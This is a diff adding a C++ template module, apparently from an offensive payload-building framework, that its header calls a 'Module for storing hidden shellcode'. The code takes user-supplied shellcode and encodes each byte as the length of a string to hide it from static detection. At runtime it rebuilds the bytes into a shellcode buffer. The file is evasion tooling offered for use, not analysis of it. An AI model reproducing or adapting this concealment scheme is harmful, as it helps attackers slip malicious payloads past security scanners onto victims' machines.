@@ -1,0 +1,67 @@
+#!name##SC_Storage_cpp
+#!types##sfile
+#!info##Module for storing hidden shellcode
+#!include##SC_Storage_h##sc_storage.h
+#!reqVar##SCC_scode##Shellcode to use. You can insert a pre-made one from the 'food' section or paste your own. If you provide your own, it must be in the format: 0x11, 0xa3, etc.##str
+#!options##add_to_comp_cmd##True
+
+#include "sc_storage.h"
+#include <iostream>
+
+
+Storage::Storage() {
+    raw_scode = {
+        {{GTOOL.scode_single_char(SCC_scode)}}
+    };
+    index = 0;
+    build();
+    size = max_index + 1;
+}
+
+
+void Storage::build() {
+            // match len
+            int c = 0;
+            for (std::string part : raw_scode) {
+                if (part != "0") {
+                    c++;
+                }
+            }
+            std::cout << "SCODE Len: " << c << " bytes." << std::endl;
+            max_index = c;
+
+        }
+
+unsigned char Storage::getRawInt() {
+            std::string buff;
+            if (index == max_index) {
+                std::cout << "\nShellcode end." << std::endl;
+                return 0;
+            }
+            buff = raw_scode.at(index);
+            index++;
+            return buff.size();
+        }
+
+std::vector<unsigned char> Storage::getSCode() {
+            // Clear vector
+            shellcode.clear();
+
+            
+            for (int i=0; i<max_index; i++) {
+                shellcode.push_back(getRawInt());
+            }
+            return shellcode;
+        }
+
+std::vector<unsigned char> Storage::getSPart(int bytes_number) {
+    //clear buffer
+    sc_buff.clear();
+    for (int i=0; i<bytes_number;i++) {
+        sc_buff.push_back(getRawInt());
+    }
+    return sc_buff;
+}
+
+
+
